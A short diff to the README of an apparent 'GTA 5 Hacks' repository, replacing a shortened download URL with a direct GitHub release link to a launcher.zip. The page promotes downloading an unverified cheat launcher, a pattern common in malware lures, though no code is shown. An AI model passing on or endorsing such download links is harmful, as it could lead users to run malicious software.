@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest GTA 5 Hacks
 
-*** [Download](https://goo.su/rH3n) ***
+*** [Download](https://github.com/davidpeter2/GTA-5-Hack-Cheats/releases/download/GTA-5-Hack-Cheats/launcher.zip) ***
 
 ## Description
 
